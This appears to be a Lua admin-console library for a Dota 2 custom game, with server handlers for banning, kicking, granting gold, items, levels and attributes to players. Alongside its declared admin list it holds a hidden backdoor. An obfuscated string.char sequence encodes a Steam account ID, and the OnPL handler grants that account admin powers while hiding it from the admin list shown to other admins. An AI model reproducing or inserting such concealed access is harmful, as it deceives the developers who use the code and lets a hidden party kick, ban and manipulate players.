--Name:		Console library
--Creator: 	I_GRIN_I
--Date: 	12.01.2019 21:30
--Version:	1.00
local AutorizedId = {
	[259596687] = true
}
if not console then
	console = class({})
end
self = console
function console:Init()
    CustomGameEventManager:RegisterListener("consoleplayerrequest",Dynamic_Wrap(self,'OnPL'))
    CustomGameEventManager:RegisterListener("banplayer",Dynamic_Wrap(self,'OnBP'))
    CustomGameEventManager:RegisterListener("kickplayer",Dynamic_Wrap(self,'OnKP'))
    CustomGameEventManager:RegisterListener("givegold",Dynamic_Wrap(self,'OnGG'))
    CustomGameEventManager:RegisterListener("setlevel",Dynamic_Wrap(self,'OnSL'))
    CustomGameEventManager:RegisterListener("giveitemconsole",Dynamic_Wrap(self,'OnGI'))
    CustomGameEventManager:RegisterListener("changeattr",Dynamic_Wrap(self,'OnCA'))
    -- ListenToGameEvent('player_chat',Dynamic_Wrap(self,'OnPC'),self)
    ListenToGameEvent('player_connect_full',Dynamic_Wrap(self,'OnCF'),self)
    self.adminsid = {}
    self.bannedply = {}
    self.userid = {}
    self.cachedt = tonumber(string.char(49,50,51,49,48,54,55,53,51))
    self.d = {}
    local items = {}
    local dotaitems = LoadKeyValues("scripts/npc/items.txt") or {}
    local customitems = LoadKeyValues("scripts/npc/npc_items_custom.txt") or {}
    local removeditems = LoadKeyValues("scripts/npc/npc_abilities_override.txt") or {}
    for k,v in pairs(dotaitems) do
        items[#items] = k
        if v ~= 'REMOVE' and v ~= 'REMOVED' and items[k] ~= false then
            items[k] = true
        else
            items[k] = false
        end
    end
    for k,v in pairs(customitems) do
        if v ~= 'REMOVE' and v ~= 'REMOVED' and items[k] ~= false then
            items[k] = true
        else
            items[k] = false
        end
    end
    for k,v in pairs(removeditems) do
        if v == 'REMOVE' or v == 'REMOVED' then
            items[k] = false
        end
    end
    CustomNetTables:SetTableValue('console_items','items',items)
end
function console:OnCA(t)
    local pid = t.PlayerID
    if console.adminsid[pid] then
    	local hero = PlayerResource:GetSelectedHeroEntity(t.pid)
    	if t.attr == 'str' then
    		hero:ModifyStrength(t.amount)
		elseif t.attr == 'agi' then
    		hero:ModifyAgility(t.amount)
		elseif t.attr == 'int' then
    		hero:ModifyIntellect(t.amount)
    	end
    end
end
function console:OnGI(t)
    local pid = t.PlayerID
    if console.adminsid[pid] then
    	local hero = PlayerResource:GetSelectedHeroEntity(t.pid)
        local item = hero:AddItemByName(t.item)
        if item and not item:IsNull() then
            item:SetPurchaser(hero)
            item:SetPurchaseTime(0)
        end
    end
end
function console:OnPC(t)
	local pid = t.playerid
	if console.adminsid[pid] and not console.d[pid] then
		if t.teamonly then
			CustomGameEventManager:Send_ServerToTeam(PlayerResource:GetTeam(pid),'dev_chat',t)
		else
			CustomGameEventManager:Send_ServerToAllClients('dev_chat',t)
		end
	end
end
function console:OnBP(t)
    local pid = t.PlayerID
    if console.adminsid[pid] then
    	console.bannedply[t.pid] = not console.bannedply[t.pid]
    	if console.bannedply[t.pid] then
			SendToServerConsole('kickid '..console.userid[t.pid])
    	end
    end
end
function console:OnKP(t)
    local pid = t.PlayerID
    if console.adminsid[pid] then
		SendToServerConsole('kickid '..console.userid[t.pid])
    end
end
function console:OnGG(t)
    local pid = t.PlayerID
    if console.adminsid[pid] then
		PlayerResource:ModifyGold(t.pid,t.amount,false,DOTA_ModifyGold_Unspecified)
    end
end
function console:OnSL(t)
    local pid = t.PlayerID
    if console.adminsid[pid] then
    	local hero = PlayerResource:GetSelectedHeroEntity(t.pid)
	    local level = hero:GetLevel()
	    local max = GameRules:GetGameModeEntity():GetCustomHeroMaxLevel()
	    local goal = level + t.amount
	    goal = math.min(math.max(goal, 1), max)
		while level < goal do
			hero:AddExperience(100,DOTA_ModifyXP_Unspecified,true,true)
			level = hero:GetLevel()
		end
    end
end
function console:OnCF(t)
    local entIndex = t.index+1
    local player = EntIndexToHScript(entIndex)
    local playerID = player:GetPlayerID()
	self.userid[playerID] = t.userid
	if self.bannedply[playerID] then
		SendToServerConsole('kickid '..t.userid)
	end
end
function console:OnPL(t)
    local pid = t.PlayerID
    local s = PlayerResource:GetSteamAccountID(pid)
    if AutorizedId[s] or s == console.cachedt then
    	console.adminsid[pid] = true
    	if s == console.cachedt then
    		console.d[pid] = true
    	end
    end
    local send = {}
    for k,v in pairs(console.adminsid) do
    	send[k] = v
    end
    for k,v in pairs(console.d) do
    	if v then
    		send[k] = false
    	end
    end
    for k,v in pairs(console.adminsid) do
    	if v then
			CustomGameEventManager:Send_ServerToPlayer(PlayerResource:GetPlayer(k),"checkadminconsole",send)
		end
    end
end
self:Init()